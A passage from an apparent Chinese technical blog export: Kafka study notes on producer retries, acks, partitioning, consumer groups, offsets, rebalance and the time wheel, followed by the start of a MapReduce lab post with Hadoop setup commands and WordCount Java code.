<h3 id="重试机制"><a href="#重试机制" class="headerlink" title="重试机制"></a>重试机制</h3><p>重试会带来一些问题：</p>
<ol>
<li><strong>消息会重复</strong>有的时候一些leader切换之类的问题，需要进行重试，设置retries即可，但是消息重试会导致,重复发送的问题，比如说网络抖动一下导致他以为没成功，就重试了，其实人家都成功了.</li>
<li><strong>消息乱序</strong>消息重试是可能导致消息的乱序的，因为可能排在你后面的消息都发送出去了。所以可以使用”max.in.flight.requests.per.connection”参数设置为1， 这样可以保证producer同一时间只能发送一条消息。两次重试的间隔默认是100毫秒，用”retry.backoff.ms”来进行设置 基本上在开发过程中，靠重试机制基本就可以搞定95%的异常问题。</li>
</ol>
<h3 id="ACK参数详解"><a href="#ACK参数详解" class="headerlink" title="ACK参数详解"></a>ACK参数详解</h3><p>producer端设置的 request.required.acks&#x3D;0；只要请求已发送出去，就算是发送完了，不关心有没有写成功。性能很好，如果是对一些日志进行分析，可以承受丢数据的情况，用这个参数，性能会很好。request.required.acks&#x3D;1；发送一条消息，当leader partition写入成功以后，才算写入成功。不过这种方式也有丢数据的可能。request.required.acks&#x3D;-1；需要ISR列表里面，所有副本都写完以后，这条消息才算写入成功。ISR：1个副本。1 leader partition 1 follower partition kafka服务端：min.insync.replicas：1， 如果我们不设置的话，默认这个值是1 一个leader partition会维护一个ISR列表，这个值就是限制ISR列表里面 至少得有几个副本，比如这个值是2，那么当ISR列表里面只有一个副本的时候。往这个分区插入数据的时候会报错。设计一个不丢数据的方案：数据不丢失的方案：1)分区副本 &gt;&#x3D;2 2)acks &#x3D; -1 3)min.insync.replicas &gt;&#x3D;2 还有可能就是发送有异常：对异常进行处理</p>
<h3 id="自定义分区"><a href="#自定义分区" class="headerlink" title="自定义分区"></a>自定义分区</h3><p>分区：1、<strong>没有设置key</strong>我们的消息就会被轮训的发送到不同的分区。2、<strong>设置了key</strong>kafka自带的分区器，会根据key计算出来一个hash值，这个hash值会对应某一个分区。如果key相同的，那么hash值必然相同，key相同的值，必然是会被发送到同一个分区。但是有些比较特殊的时候，我们就需要自定义分区</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class HotDataPartitioner implements Partitioner &#123;</span><br><span class="line">private Random random;</span><br><span class="line">@Override</span><br><span class="line">public void configure(Map&lt;String, ?&gt; configs) &#123;</span><br><span class="line">random = new Random();</span><br><span class="line">&#125;</span><br><span class="line">@Override</span><br><span class="line">public int partition(String topic, Object keyObj, byte[] keyBytes, Object value, byte[] valueBytes, Cluster cluster) &#123;</span><br><span class="line">String key = (String)keyObj;</span><br><span class="line">List partitionInfoList = cluster.availablePartitionsForTopic(topic);</span><br><span class="line">//获取到分区的个数 0,1，2</span><br><span class="line">int partitionCount = partitionInfoList.size();</span><br><span class="line">//最后一个分区</span><br><span class="line">int hotDataPartition = partitionCount - 1;</span><br><span class="line">return !key.contains(“hot_data”) ? random.nextInt(partitionCount - 1) : hotDataPartition;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>如何使用：配置上这个类即可：<strong>props.put(”partitioner.class”, “com.zhss.HotDataPartitioner”)</strong>;</p>
<h3 id="综合案例演示"><a href="#综合案例演示" class="headerlink" title="综合案例演示"></a>综合案例演示</h3><p>1消费组概念 groupid相同就属于同一个消费组 1）每个consumer都要属于一个consumer.group，就是一个消费组，topic的一个分区只会分配给 一个消费组下的一个consumer来处理，每个consumer可能会分配多个分区，也有可能某个consumer没有分配到任何分区 2）如果想要实现一个广播的效果，那只需要使用不同的group id去消费就可以。topicA: partition0、partition1 groupA：consumer1:消费 partition0 consuemr2:消费 partition1 consuemr3:消费不到数据 groupB: consuemr3:消费到partition0和partition1 3）如果consumer group中某个消费者挂了，此时会自动把分配给他的分区交给其他的消费者，如果他又重启了，那么又会把一些分区重新交还给他</p>
<h2 id="Kafka消费者"><a href="#Kafka消费者" class="headerlink" title="Kafka消费者"></a>Kafka消费者</h2><h3 id="消费组概念"><a href="#消费组概念" class="headerlink" title="消费组概念"></a>消费组概念</h3><p>groupid相同就属于同一个消费组 </p>
<p>1）每个consumer都要属于一个consumer.group，就是一个消费组，topic的一个分区只会分配给一个消费组下的一个consumer来处理，每个consumer可能会分配多个分区，也有可能某个consumer没有分配到任何分区 </p>
<p>2）如果想要实现一个广播的效果，那只需要使用不同的group id去消费就可以。topicA: partition0、partition1 groupA：consumer1:消费 partition0 consuemr2:消费 partition1 consuemr3:消费不到数据 groupB: consuemr3:消费到partition0和partition1 3）如果consumer group中某个消费者挂了，此时会自动把分配给他的分区交给其他的消费者，如果他又重启了，那么又会把一些分区重新交还给他</p>
<h3 id="基础案例演示"><a href="#基础案例演示" class="headerlink" title="基础案例演示"></a>基础案例演示</h3><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/aed77e9fab134609aed020088015f63a~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
<h3 id="偏移量管理"><a href="#偏移量管理" class="headerlink" title="偏移量管理"></a>偏移量管理</h3><ol>
<li>每个consumer内存里数据结构保存对每个topic的每个分区的消费offset，定期会提交offset，老版本是写入zk，但是那样高并发请求zk是不合理的架构设计，zk是做分布式系统的协调的，轻量级的元数据存储，不能负责高并发读写，作为数据存储。</li>
<li>现在新的版本提交offset发送给kafka内部topic：__consumer_offsets，提交过去的时候， key是group.id+topic+分区号，value就是当前offset的值，每隔一段时间，kafka内部会对这个topic进行compact(合并)，也就是每个group.id+topic+分区号就保留最新数据。</li>
<li>__consumer_offsets可能会接收高并发的请求，所以默认分区50个(leader partitiron -&gt; 50 kafka)，这样如果你的kafka部署了一个大的集群，比如有50台机器，就可以用50台机器来抗offset提交的请求压力. 消费者 -&gt; broker端的数据 message -&gt; 磁盘 -&gt; offset 顺序递增 从哪儿开始消费？-&gt; offset 消费者（offset）</li>
</ol>
<h3 id="偏移量监控工具介绍"><a href="#偏移量监控工具介绍" class="headerlink" title="偏移量监控工具介绍"></a>偏移量监控工具介绍</h3><ol>
<li>web页面管理的一个管理软件(kafka Manager) 修改bin&#x2F;kafka-run-class.sh脚本，第一行增加JMX_PORT&#x3D;9988 <strong>重启kafka进程</strong></li>
<li>另一个软件：主要监控的consumer的偏移量。就是一个jar包 java -cp KafkaOffsetMonitor-assembly-0.3.0-SNAPSHOT.jar com.quantifind.kafka.offsetapp.OffsetGetterWeb –offsetStorage kafka \（根据版本：偏移量存在kafka就填kafka，存在zookeeper就填zookeeper） –zk hadoop1:2181 –port 9004 –refresh 15.seconds –retain 2.days。</li>
</ol>
<h3 id="消费异常感知"><a href="#消费异常感知" class="headerlink" title="消费异常感知"></a>消费异常感知</h3><p>heartbeat.interval.ms：consumer心跳时间间隔，必须得与coordinator保持心跳才能知道consumer是否故障了， 然后如果故障之后，就会通过心跳下发rebalance的指令给其他的consumer通知他们进行rebalance的操作 session.timeout.ms：kafka多长时间感知不到一个consumer就认为他故障了，默认是10秒 max.poll.interval.ms：如果在两次poll操作之间，超过了这个时间，那么就会认为这个consume处理能力太弱了，会被踢出消费组，分区分配给别人去消费，一般来说结合业务处理的性能来设置就可以了。</p>
<h3 id="核心参数解释"><a href="#核心参数解释" class="headerlink" title="核心参数解释"></a>核心参数解释</h3><p>fetch.max.bytes：获取一条消息最大的字节数，一般建议设置大一些，默认是1M 其实我们在之前多个地方都见到过这个类似的参数，意思就是说一条信息最大能多大？</p>
<ol>
<li>Producer 发送的数据，一条消息最大多大， -&gt; 10M</li>
<li>Broker 存储数据，一条消息最大能接受多大 -&gt; 10M</li>
<li>Consumer max.poll.records: 一次poll返回消息的最大条数，默认是500条 connection.max.idle.ms：consumer跟broker的socket连接如果空闲超过了一定的时间，此时就会自动回收连接，但是下次消费就要重新建立socket连接，这个建议设置为-1，不要去回收 enable.auto.commit: 开启自动提交偏移量 auto.commit.interval.ms: 每隔多久提交一次偏移量，默认值5000毫秒 _consumer_offset auto.offset.reset：earliest 当各分区下有已提交的offset时，从提交的offset开始消费；无提交的offset时，从头开始消费 topica -&gt; partition0:1000 partitino1:2000 latest 当各分区下有已提交的offset时，从提交的offset开始消费；无提交的offset时，消费新产生的该分区下的数据 none topic各分区都存在已提交的offset时，从offset后开始消费；只要有一个分区不存在已提交的offset，则抛出异常</li>
</ol>
<h3 id="综合案例演示-1"><a href="#综合案例演示-1" class="headerlink" title="综合案例演示"></a>综合案例演示</h3><p>引入案例：二手电商平台（欢乐送），根据用户消费的金额，对用户星星进行累计。订单系统（生产者） -&gt; Kafka集群里面发送了消息。会员系统（消费者） -&gt; Kafak集群里面消费消息，对消息进行处理。</p>
<h3 id="group-coordinator原理"><a href="#group-coordinator原理" class="headerlink" title="group coordinator原理"></a>group coordinator原理</h3><p>面试题：消费者是如何实现rebalance的？— 根据coordinator实现</p>
<ol>
<li>什么是coordinator 每个consumer group都会选择一个broker作为自己的coordinator，他是负责监控这个消费组里的各个消费者的心跳，以及判断是否宕机，然后开启rebalance的</li>
<li>如何选择coordinator机器 首先对groupId进行hash（数字），接着对__consumer_offsets的分区数量取模，默认是50，_consumer_offsets的分区数可以通过offsets.topic.num.partitions来设置，找到分区以后，这个分区所在的broker机器就是coordinator机器。比如说：groupId，“myconsumer_group” -&gt; hash值（数字）-&gt; 对50取模 -&gt; 8 __consumer_offsets 这个主题的8号分区在哪台broker上面，那一台就是coordinator 就知道这个consumer group下的所有的消费者提交offset的时候是往哪个分区去提交offset，</li>
<li>运行流程 1）每个consumer都发送JoinGroup请求到Coordinator， 2）然后Coordinator从一个consumer group中选择一个consumer作为leader， 3）把consumer group情况发送给这个leader， 4）接着这个leader会负责制定消费方案， 5）通过SyncGroup发给Coordinator 6）接着Coordinator就把消费方案下发给各个consumer，他们会从指定的分区的 leader broker开始进行socket连接以及消费消息</li>
</ol>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c9e984d9f2504c86a1323192e84f4a75~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
<h3 id="rebalance策略"><a href="#rebalance策略" class="headerlink" title="rebalance策略"></a>rebalance策略</h3><p>consumer group靠coordinator实现了Rebalance</p>
<p>这里有三种rebalance的策略：range、round-robin、sticky</p>
<p>比如我们消费的一个主题有12个分区：p0,p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11 假设我们的消费者组里面有三个消费者</p>
<ol>
<li>range策略 range策略就是按照partiton的序号范围 p0~3 consumer1 p4<del>7 consumer2 p8</del>11 consumer3 默认就是这个策略；</li>
<li>round-robin策略 就是轮询分配 consumer1:0,3,6,9 consumer2:1,4,7,10 consumer3:2,5,8,11 但是前面的这两个方案有个问题：12 -&gt; 2 每个消费者会消费6个分区</li>
</ol>
<p>假设consuemr1挂了:p0-5分配给consumer2,p6-11分配给consumer3 这样的话，原本在consumer2上的的p6,p7分区就被分配到了 consumer3上。</p>
<ol>
<li>sticky策略 最新的一个sticky策略，就是说尽可能保证在rebalance的时候，让原本属于这个consumer 的分区还是属于他们，然后把多余的分区再均匀分配过去，这样尽可能维持原来的分区分配的策略</li>
</ol>
<p>consumer1：0-3 consumer2: 4-7 consumer3: 8-11 假设consumer3挂了 consumer1：0-3，+8,9 consumer2: 4-7，+10,11</p>
<h2 id="Broker管理"><a href="#Broker管理" class="headerlink" title="Broker管理"></a>Broker管理</h2><p>15.1 Leo、hw含义</p>
<ol>
<li>Kafka的核心原理</li>
<li>如何去评估一个集群资源</li>
<li>搭建了一套kafka集群 -》 介绍了简单的一些运维管理的操作。</li>
<li>生产者（使用，核心的参数）</li>
<li>消费者（原理，使用的，核心参数）</li>
<li>broker内部的一些原理</li>
</ol>
<p>核心的概念：LEO，HW LEO：是跟offset偏移量有关系。</p>
<p>LEO：在kafka里面，无论leader partition还是follower partition统一都称作副本（replica）。</p>
<blockquote>
<p>每次partition接收到一条消息，都会更新自己的LEO，也就是log end offset，LEO其实就是最新的offset + 1</p>
</blockquote>
<p>HW：高水位 LEO有一个很重要的功能就是更新HW，如果follower和leader的LEO同步了，此时HW就可以更新 HW之前的数据对消费者是可见，消息属于commit状态。HW之后的消息消费者消费不到。</p>
<h3 id="Leo更新"><a href="#Leo更新" class="headerlink" title="Leo更新"></a>Leo更新</h3><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/396815ebdb1b4c6e84c327b89a41dedb~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
<h3 id="hw更新"><a href="#hw更新" class="headerlink" title="hw更新"></a>hw更新</h3><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/414c9b515d6c4aca8358dc2ea8b04f04~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
<h3 id="controller如何管理整个集群"><a href="#controller如何管理整个集群" class="headerlink" title="controller如何管理整个集群"></a>controller如何管理整个集群</h3><p>1: 竞争controller的 &#x2F;controller&#x2F;id 2：controller服务监听的目录：&#x2F;broker&#x2F;ids&#x2F; 用来感知 broker上下线 &#x2F;broker&#x2F;topics&#x2F; 创建主题，我们当时创建主题命令，提供的参数，ZK地址。&#x2F;admin&#x2F;reassign_partitions 分区重分配 ……<a href="https://link.juejin.cn/?target=http://mp.weixin.qq.com/s?__biz=MzIxMTE0ODU5NQ==&mid=2650245169&idx=2&sn=54ffaab18e546e714519880a141627c0&chksm=8f5ae26db82d6b7bf2b51ea15938ce8623f4593cf228e801c0920b1dda4a01b29da0b1956118&scene=21%23wechat_redirect"><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ebb809ac0a0f417e9438b33890959b85~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></a></p>
<h3 id="延时任务"><a href="#延时任务" class="headerlink" title="延时任务"></a>延时任务</h3><p>kafka的延迟调度机制（扩展知识） 我们先看一下kafka里面哪些地方需要有任务要进行延迟调度。第一类延时的任务：比如说producer的acks&#x3D;-1，必须等待leader和follower都写完才能返回响应。有一个超时时间，默认是30秒（request.timeout.ms）。所以需要在写入一条数据到leader磁盘之后，就必须有一个延时任务，到期时间是30秒延时任务 放到DelayedOperationPurgatory（延时管理器）中。假如在30秒之前如果所有follower都写入副本到本地磁盘了，那么这个任务就会被自动触发苏醒，就可以返回响应结果给客户端了， 否则的话，这个延时任务自己指定了最多是30秒到期，如果到了超时时间都没等到，就直接超时返回异常。第二类延时的任务：follower往leader拉取消息的时候，如果发现是空的，此时会创建一个延时拉取任务 延时时间到了之后（比如到了100ms），就给follower返回一个空的数据，然后follower再次发送请求读取消息， 但是如果延时的过程中(还没到100ms)，leader写入了消息，这个任务就会自动苏醒，自动执行拉取任务。</p>
<p>海量的延时任务，需要去调度。</p>
<h3 id="时间轮机制"><a href="#时间轮机制" class="headerlink" title="时间轮机制"></a>时间轮机制</h3><ol>
<li>什么会有要设计时间轮？Kafka内部有很多延时任务，没有基于JDK Timer来实现，那个插入和删除任务的时间复杂度是O(nlogn)， 而是基于了自己写的时间轮来实现的，时间复杂度是O(1)，依靠时间轮机制，延时任务插入和删除，O(1)</li>
<li>时间轮是什么？其实时间轮说白其实就是一个数组。tickMs:时间轮间隔 1ms wheelSize：时间轮大小 20 interval：timckMS * whellSize，一个时间轮的总的时间跨度。20ms currentTime：当时时间的指针。a:因为时间轮是一个数组，所以要获取里面数据的时候，靠的是index，时间复杂度是O(1) b:数组某个位置上对应的任务，用的是双向链表存储的，往双向链表里面插入，删除任务，时间复杂度也是O（1） 举例：插入一个8ms以后要执行的任务 19ms 3.多层级的时间轮 比如：要插入一个110毫秒以后运行的任务。tickMs:时间轮间隔 20ms wheelSize：时间轮大小 20 interval：timckMS * whellSize，一个时间轮的总的时间跨度。20ms currentTime：当时时间的指针。第一层时间轮：1ms * 20 第二层时间轮：20ms * 20 第三层时间轮：400ms * 20</li>
</ol>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0c99ba8e63f543a09afaebcaef61a9a5~tplv-k3u1fbpfcp-watermark.awebp" alt="图片"></p>
]]></content>
      <categories>
        <category>base</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>Lab-3 MapReduce</title>
    <url>/2021/12/22/Lab-3%20MapReduce/</url>
    <content><![CDATA[<h1 id="Lab-3-MapReduce配置与操作"><a href="#Lab-3-MapReduce配置与操作" class="headerlink" title="Lab-3 MapReduce配置与操作"></a>Lab-3 MapReduce配置与操作</h1><h2 id="一、实验原理分析"><a href="#一、实验原理分析" class="headerlink" title="一、实验原理分析"></a>一、实验原理分析</h2><h3 id="MapReduce是什么"><a href="#MapReduce是什么" class="headerlink" title="MapReduce是什么"></a>MapReduce是什么</h3><p>MapReduce 是一个分布式运算程序的编程框架，是用户开发“基于 Hadoop 的数据分析</p>
<p>应用”的核心框架。</p>
<p>MapReduce 核心功能是将用户编写的业务逻辑代码和自带默认组件整合成一个完整的</p>
<p>分布式运算程序，并发运行在一个 Hadoop 集群上。</p>
<h3 id="MapReduce优缺点"><a href="#MapReduce优缺点" class="headerlink" title="MapReduce优缺点"></a>MapReduce优缺点</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
<li><p><strong>MapReduce 易于编程</strong></p>
<p>它简单的实现一些接口，就可以完成一个分布式程序，这个分布式程序可以分布到大量</p>
<p>廉价的 PC 机器上运行。也就是说你写一个分布式程序，跟写一个简单的串行程序是一模一</p>
<p>样的。就是因为这个特点使得 MapReduce 编程变得非常流行。</p>
</li>
<li><p><strong>良好的扩展性</strong></p>
<p>当你的计算资源不能得到满足的时候，你可以通过简单的增加机器来扩展它的计算能力。</p>
</li>
<li><p><strong>高容错性</strong></p>
<p>MapReduce 设计的初衷就是使程序能够部署在廉价的 PC 机器上，这就要求它具有很高</p>
<p>的容错性。比如其中一台机器挂了，它可以把上面的计算任务转移到另外一个节点上运行，</p>
<p>不至于这个任务运行失败，而且这个过程不需要人工参与，而完全是由 Hadoop 内部完成的。</p>
</li>
<li><p><strong>适合 PB 级以上海量数据的离线处理</strong></p>
<p>可以实现上千台服务器集群并发工作，提供数据处理能力。</p>
</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li><p><strong>不擅长实时计算</strong></p>
<p>MapReduce 无法像 MySQL 一样，在毫秒或者秒级内返回结果。</p>
</li>
<li><p><strong>不擅长流式计算</strong></p>
<p>流式计算的输入数据是动态的，而 MapReduce 的输入数据集是静态的，不能动态变化。</p>
<p>这是因为 MapReduce 自身的设计特点决定了数据源必须是静态的。</p>
</li>
<li><p><strong>不擅长 DAG（有向无环图）计算</strong></p>
<p>多个应用程序存在依赖关系，后一个应用程序的输入为前一个的输出。在这种情况下，</p>
<p>MapReduce 并不是不能做，而是使用后，每个 MapReduce 作业的输出结果都会写入到磁盘，</p>
<p>会造成大量的磁盘 IO，导致性能非常的低下。</p>
</li>
</ul>
<h3 id="MapReduce核心思想"><a href="#MapReduce核心思想" class="headerlink" title="MapReduce核心思想"></a>MapReduce核心思想</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220107200.png" alt="image-20210701084254232"></p>
<ul>
<li><p>分布式的运算程序往往需要分成至少 2 个阶段。</p>
</li>
<li><p>第一个阶段的 MapTask 并发实例，完全并行运行，互不相干。</p>
</li>
<li><p>第二个阶段的 ReduceTask 并发实例互不相干，但是他们的数据依赖于上一个阶段</p>
</li>
</ul>
<p>的所有 MapTask 并发实例的输出。</p>
<ul>
<li>MapReduce 编程模型只能包含一个 Map 阶段和一个 Reduce 阶段，如果用户的业</li>
</ul>
<p>务逻辑非常复杂，那就只能多个 MapReduce 程序，串行运行。</p>
<h3 id="MapReduce进程"><a href="#MapReduce进程" class="headerlink" title="MapReduce进程"></a>MapReduce进程</h3><p>一个完整的 MapReduce 程序在分布式运行时有三类实例进程：</p>
<ul>
<li><strong>MrAppMaster</strong>：负责整个程序的过程调度及状态协调。</li>
<li><strong>MapTask</strong>：负责 Map 阶段的整个数据处理流程。</li>
<li><strong>ReduceTask</strong>：负责 Reduce 阶段的整个数据处理流程。</li>
</ul>
<h3 id="常用数据序列化类型"><a href="#常用数据序列化类型" class="headerlink" title="常用数据序列化类型"></a>常用数据序列化类型</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110273.png" alt="image-20210701084749392"></p>
<h3 id="MapReduce编程规范"><a href="#MapReduce编程规范" class="headerlink" title="MapReduce编程规范"></a>MapReduce编程规范</h3><p>1．Mapper阶段</p>
<p>（1）用户自定义的Mapper要继承自己的父类</p>
<p>（2）Mapper的输入数据是KV对的形式（KV的类型可自定义） </p>
<p>（3）Mapper中的业务逻辑写在map()方法中</p>
<p>（4）Mapper的输出数据是KV对的形式（KV的类型可自定义） </p>
<p>（5）map()方法（MapTask进程）对每一个&lt;K,V&gt;调用一次</p>
<p>2．Reducer阶段</p>
<p>（1）用户自定义的Reducer要继承自己的父类</p>
<p>（2）Reducer的输入数据类型对应Mapper的输出数据类型，也是KV</p>
<p>（3）Reducer的业务逻辑写在reduce()方法中</p>
<p>（4）ReduceTask进程对每一组相同k的&lt;k,v&gt;组调用一次reduce()方法</p>
<p>3．Driver阶段</p>
<p>相当于YARN集群的客户端，用于提交我们整个程序到YARN集群，提交的是</p>
<p>封装了MapReduce程序相关运行参数的job对象</p>
<h2 id="二、实验代码及命令分析"><a href="#二、实验代码及命令分析" class="headerlink" title="二、实验代码及命令分析"></a>二、实验代码及命令分析</h2><h3 id="在Mac上配置hadoop环境"><a href="#在Mac上配置hadoop环境" class="headerlink" title="在Mac上配置hadoop环境"></a>在Mac上配置hadoop环境</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将hadoop102里的hadoop打包复制到mac下</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/module/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打包</span></span><br><span class="line">[huang@hadoop102 module]$ tar -zcvf hadoop-3.1.3.tar.gz /opt/module/hadoop-3.1.3/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制</span></span><br><span class="line">[huang@hadoop102 module]$ scp hadoop-3.1.3.tar.gz huangmingwang@10.211.55.2:/Users/huangmingwang/Documents/Hadoop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置环境变量</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % sudo vi .bash_profile </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">hadoop</span></span><br><span class="line">export HADOOP_HOME=/Users/huangmingwang/Documents/Hadoop/hadoop-3.1.3 </span><br><span class="line">export HADOOP_USER_NAME=huang</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">让配置文件生效</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % source .bash_profile</span><br></pre></td></tr></table></figure>



<h3 id="本地测试WordCount"><a href="#本地测试WordCount" class="headerlink" title="本地测试WordCount"></a>本地测试WordCount</h3><p>WordCountDriver.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountDriver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1 获取job</span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">conf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance(conf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2 设置jar包路径</span></span><br><span class="line">        job.setJarByClass(WordCountDriver.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3 关联mapper和reducer</span></span><br><span class="line">        job.setMapperClass(WordCountMapper.class);</span><br><span class="line">        job.setReducerClass(WordCountReducer.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4 设置map输出的kv类型</span></span><br><span class="line">        job.setMapOutputKeyClass(Text.class);</span><br><span class="line">        job.setMapOutputValueClass(IntWritable.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5 设置最终输出的kV类型</span></span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(IntWritable.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6 设置输入路径和输出路径</span></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/Users/huangmingwang/Documents/input&quot;</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/Users/huangmingwang/Documents/output&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7 提交job</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> job.waitForCompletion(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        System.exit(result ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>WordCountMapper.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.LongWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * KEYIN, map阶段输入的key的类型：LongWritable</span></span><br><span class="line"><span class="comment"> * VALUEIN,map阶段输入value类型：Text</span></span><br><span class="line"><span class="comment"> * KEYOUT,map阶段输出的Key类型：Text</span></span><br><span class="line"><span class="comment"> * VALUEOUT,map阶段输出的value类型：IntWritable</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;LongWritable, Text, Text, IntWritable&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Text</span> <span class="variable">outK</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">IntWritable</span> <span class="variable">outV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(LongWritable key, Text value, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1 获取一行</span></span><br><span class="line">        <span class="comment">// atguigu atguigu</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> value.toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2 切割</span></span><br><span class="line">        <span class="comment">// atguigu</span></span><br><span class="line">        <span class="comment">// atguigu</span></span><br><span class="line">        String[] words = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3 循环写出</span></span><br><span class="line">        <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">            <span class="comment">// 封装outk</span></span><br><span class="line">            outK.set(word);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 写出</span></span><br><span class="line">            context.write(outK, outV);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>WordCountReducer.java</p>
